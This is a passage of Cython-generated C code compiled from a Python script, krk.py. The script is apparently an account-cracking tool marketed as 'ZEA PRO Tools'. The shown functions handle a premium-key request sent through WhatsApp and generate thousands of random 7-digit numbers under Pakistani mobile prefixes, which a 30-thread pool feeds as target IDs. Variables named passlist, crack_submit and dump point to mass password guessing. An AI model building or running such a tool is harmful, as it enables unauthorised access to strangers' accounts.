          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_13};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 220, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_int_2};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 220, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "krk.py":221
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 *                         print(' Run :  python ZEA.py')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         exit()
 */
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 221, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "krk.py":222
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 *                         print(' Run :  python ZEA.py')
 *                         linex()             # <<<<<<<<<<<<<<
 *                         exit()
 *         except ValueError:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_linex); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 222, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_4 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_4, };
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 222, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "krk.py":223
 *                         print(' Run :  python ZEA.py')
 *                         linex()
 *                         exit()             # <<<<<<<<<<<<<<
 *         except ValueError:
 *                 exit()
 */
        __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 223, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __pyx_L9:;

      /* "krk.py":77
 * 
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                 clear()
 *                 x = ("zea")
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":224
 *                         linex()
 *                         exit()
 *         except ValueError:             # <<<<<<<<<<<<<<
 *                 exit()
 *         except requests.exceptions.ConnectionError:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_13, &__pyx_t_4) < 0) __PYX_ERR(0, 224, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_13);
      __Pyx_XGOTREF(__pyx_t_4);

      /* "krk.py":225
 *                         exit()
 *         except ValueError:
 *                 exit()             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *                 print('\n No internet connection ...')
 */
      __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 225, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }

    /* "krk.py":226
 *         except ValueError:
 *                 exit()
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *                 print('\n No internet connection ...')
 *                 exit()
 */
    __Pyx_ErrFetch(&__pyx_t_4, &__pyx_t_13, &__pyx_t_6);
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 226, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 226, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_15);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 226, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
    __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_4, __pyx_t_5);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_ErrRestore(__pyx_t_4, __pyx_t_13, __pyx_t_6);
    __pyx_t_4 = 0; __pyx_t_13 = 0; __pyx_t_6 = 0;
    if (__pyx_t_7) {
      __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_13, &__pyx_t_4) < 0) __PYX_ERR(0, 226, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_13);
      __Pyx_XGOTREF(__pyx_t_4);

      /* "krk.py":227
 *                 exit()
 *         except requests.exceptions.ConnectionError:
 *                 print('\n No internet connection ...')             # <<<<<<<<<<<<<<
 *                 exit()
 * def pak():
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 227, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "krk.py":228
 *         except requests.exceptions.ConnectionError:
 *                 print('\n No internet connection ...')
 *                 exit()             # <<<<<<<<<<<<<<
 * def pak():
 *                 user=[]
 */
      __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 228, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":77
 * 
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                 clear()
 *                 x = ("zea")
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "krk.py":76
 * tokenku=[]
 * 
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                 clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_x);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_fo);
  __Pyx_XDECREF(__pyx_v_mthd);
  __Pyx_XDECREF(__pyx_v_plist);
  __Pyx_XDECREF(__pyx_v_ppp);
  __Pyx_XDECREF(__pyx_v_ps_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_cx);
  __Pyx_XDECREF(__pyx_v_crack_submit);
  __Pyx_XDECREF(__pyx_v_total_ids);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_ids);
  __Pyx_XDECREF(__pyx_v_names);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XDECREF(__pyx_v_dump);
  __Pyx_XDECREF(__pyx_v_wx);
  __Pyx_XDECREF(__pyx_v_url_wa);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_tks);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":229
 *                 print('\n No internet connection ...')
 *                 exit()
 * def pak():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_7pak(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_7pak = {"pak", (PyCFunction)__pyx_pw_3krk_7pak, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_7pak(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("pak (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_6pak(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_3pak_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":239
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */

static PyObject *__pyx_pf_3krk_3pak_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct__genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct__genexpr *)__pyx_tp_new_3krk___pyx_scope_struct__genexpr(__pyx_ptype_3krk___pyx_scope_struct__genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct__genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 239, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_3pak_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_pak_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.pak.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_3pak_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct__genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 239, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 7; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 239, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 239, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":229
 *                 print('\n No internet connection ...')
 *                 exit()
 * def pak():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

static PyObject *__pyx_pf_3krk_6pak(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_code = NULL;
  PyObject *__pyx_v_limit = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_nmbr = NULL;
  PyObject *__pyx_v_nmp = NULL;
  PyObject *__pyx_v_Sabir = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_psx = NULL;
  PyObject *__pyx_v_ids = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_gb_3krk_3pak_2generator = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  int __pyx_t_16;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("pak", 0);

  /* "krk.py":230
 *                 exit()
 * def pak():
 *                 user=[]             # <<<<<<<<<<<<<<
 *                 clear()
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 230, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_user = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  /* "krk.py":231
 * def pak():
 *                 user=[]
 *                 clear()             # <<<<<<<<<<<<<<
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":232
 *                 user=[]
 *                 clear()
 *                 print('\033[1;33m Code example: 077,078,070,079,076')             # <<<<<<<<<<<<<<
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 232, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":233
 *                 clear()
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')             # <<<<<<<<<<<<<<
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 233, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_code = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":234
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      /* "krk.py":235
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))             # <<<<<<<<<<<<<<
 *                 except ValueError:
 *                         limit = 5000
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_limit = __pyx_t_2;
      __pyx_t_2 = 0;

      /* "krk.py":234
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "krk.py":236
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:             # <<<<<<<<<<<<<<
 *                         limit = 5000
 *                 for nmbr in range(limit):
 */
    __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_4) {
      __Pyx_AddTraceback("krk.pak", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 236, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_3);

      /* "krk.py":237
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 *                         limit = 5000             # <<<<<<<<<<<<<<
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 */
      __Pyx_INCREF(__pyx_int_5000);
      __Pyx_XDECREF_SET(__pyx_v_limit, __pyx_int_5000);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":234
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 *                 except ValueError:
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
